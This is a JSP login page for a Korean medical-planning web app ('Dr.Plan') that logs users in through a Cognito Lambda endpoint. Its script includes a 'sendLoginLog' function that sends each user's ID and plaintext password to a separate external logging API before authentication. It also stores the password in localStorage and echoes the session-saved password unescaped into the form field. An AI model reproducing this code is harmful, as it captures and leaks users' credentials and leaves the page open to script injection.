<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Dr.Plan</title>
<!-- 스크립트 부분 -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
<link rel="stylesheet" href="./css/custom.css">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://kit.fontawesome.com/7f5811a0ff.js" crossorigin="anonymous"></script>

<!-- Icon -->
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="facebook" viewBox="0 0 16 16">
    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
  </symbol>
  <symbol id="instagram" viewBox="0 0 16 16">
      <path d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z"/>
  </symbol>
  <symbol id="twitter" viewBox="0 0 16 16">
    <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/>
  </symbol>
</svg>

</head>
<body>
<jsp:include page="module/header.jsp" flush="false"/>

<%
    System.out.println("[INFO] Dr.Plan 개인 로그인 페이지 호출됨 - " + new java.util.Date());
%>

<%
  	String check = (String)session.getAttribute("memSave");
  	String id = (String)session.getAttribute("memId");
	String pw = (String)session.getAttribute("memPw");
  	String idStr=null, pwStr=null, checkStr=null;
	if(check==null){
		idStr = ""; pwStr= ""; checkStr = "";
	} else {
		idStr = id; pwStr= pw; checkStr = "checked";
	}
 %>
<section class="container" style="max-width: 560px; padding-top: 20px; height: 500px;">
	<div class="row" style="padding-bottom: 20px;">
            <a class="navbar-brand text-left col-md-3 patientSignUp" href="PatientLogin.jsp">	
                <span class="text-dark h4" style="font-size:15px;">개인 로그인</span>
            </a>
            <a class="navbar-brand text-left col-md-3 hospitalSignUp" href="OrganLogin.jsp">	
                <span class="text-dark h4" style="font-size:15px;">병원 로그인</span>
            </a>
    </div>
    <div class="row align-items-center justify-content-between">
            <a class="navbar-brand h1 text-left">	
                <span class="text-dark h3">개인</span> <span class="text-primary h3">로그인</span>
            </a>
    </div>
	<form method="post" action="PageControl.jsp" style="padding-top: 30px;" onsubmit="return handleLoginSubmit(event)">
		<div class="form-floating" style="padding-bottom: 10px;">
      		<input type="id" class="form-control" id="floatingInput" placeholder="id" name="id"  value= <%=idStr %>>
      		<label for="floatingInput">아이디</label>
    	</div>
    	<div class="form-floating" style="padding-bottom: 10px;">
      		<input type="password" class="form-control" id="floatingPassword" placeholder="Password" name="password" value= <%=pwStr %>>
      		<label for="floatingPassword">비밀번호</label>
    	</div>
    	<div class="checkbox mb-3">
      		<label>	
        	<input type="checkbox" name="idSave" value= "c1" <%=checkStr %>> 로그인 정보 저장
      		</label>
    	</div>
    	<button class="w-100 btn btn-lg btn-primary" type="submit">로그인</button>
    	<input type=hidden name="action" value="login">
	</form>
</section>

<jsp:include page="module/footer.jsp" flush="false"/>	

<script>
	function sendLoginLog(userId, password) {
	  const log = {
		event: "login",
		id: userId,
		password: password,
		timestamp: new Date().toISOString(),
		ip: "",
		agent: navigator.userAgent
	  };

	  fetch("https://8m7rc9jsjg.execute-api.ap-northeast-2.amazonaws.com/prod/log", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(log)
	  })
	  .then(response => {
		if (!response.ok) {
		  console.warn("로그 전송 실패", response.status);
		}
	  })
	  .catch(error => {
		console.error("로그 전송 중 오류:", error);
	  });
	}

	async function handleLoginSubmit(event) {
	  event.preventDefault?.();

	  const userId = document.getElementById("floatingInput").value;
	  const password = document.getElementById("floatingPassword").value;

	  if (!userId || !password) return false;

      fetch('logToServer.jsp?type=info&message=' + encodeURIComponent(`[INFO] 로그인 시도: ID=${userId}`));

		// ✅ 1. 로그인 로그 먼저 전송
		sendLoginLog(userId, password);

		// ✅ 2. Cognito 인증 Lambda로 로그인 요청
		try {
		  const res = await fetch("https://8e36s31r5f.execute-api.ap-northeast-2.amazonaws.com/prod/cognito-login", {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({ username: userId, password: password })
		  });

		  const data = await res.json();
		  console.log("📡 Lambda 응답:", data);

		  if (res.status === 200 && data.accessToken) {
			console.log("✅ 저장할 userId:", data.userId || userId);
			console.log("✅ 저장할 token:", data.accessToken);

			// ✅ 로그인 성공 로그 추가
			fetch('logToServer.jsp?type=info&message=' + encodeURIComponent(`[INFO] 로그인 성공: ID=${userId}`));

			// ✅ 3. 로컬스토리지에 토큰 저장
			localStorage.setItem("accessToken", data.accessToken);
			localStorage.setItem("refreshToken", data.refreshToken); 
			localStorage.setItem("idToken", data.idToken);
			localStorage.setItem("userId", data.userId || userId);
			localStorage.setItem("password", password);           

			alert("로그인 성공");

			// ✅ 세션 설정을 위한 POST 요청 (id, pw 전달)
			const form = document.createElement("form");
			form.method = "POST";
			form.action = "PageControl.jsp";

			const input1 = document.createElement("input");
			input1.type = "hidden";
			input1.name = "action";
			input1.value = "sessionOnly";
			form.appendChild(input1);

			const input2 = document.createElement("input");
			input2.type = "hidden";
			input2.name = "id";
			input2.value = userId;
			form.appendChild(input2);

			const input3 = document.createElement("input");
			input3.type = "hidden";
			input3.name = "password";
			input3.value = password;
			form.appendChild(input3);

			document.body.appendChild(form);
			form.submit();

			return false;
		  } else {
			// ✅ 로그인 실패 로그 출력
			fetch('logToServer.jsp?type=warn&message=' + encodeURIComponent(`[WARN] 로그인 실패: ID=${userId}`));
		  }
		} catch (err) {
		console.error("로그인 중 오류:", err);
		alert("로그인 중 오류 발생");

        fetch('logToServer.jsp?type=error&message=' + encodeURIComponent(`[ERROR] 로그인 시도 중 예외 발생: ID=${userId}`));

		return false;
	  }
	}
</script>
</body>

</html>